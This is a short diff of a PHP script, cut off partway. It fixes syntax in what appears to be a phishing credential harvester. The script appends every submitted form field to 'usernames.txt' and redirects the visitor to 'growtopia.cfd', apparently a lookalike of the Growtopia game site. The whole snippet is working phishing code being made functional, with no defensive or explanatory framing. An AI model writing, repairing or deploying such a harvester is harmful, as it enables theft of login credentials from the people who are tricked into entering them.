@@ -1,7 +1,6 @@
 <?php
-header
-('location:');
-$handle-fopen("usernames.txt", "a");
+header('Location: https://growtopia.cfd/');
+$handle = fopen("usernames.txt", "a");
 foreach($_POST as $variable=>$value)
 {
 fwrite($handle, $variable);
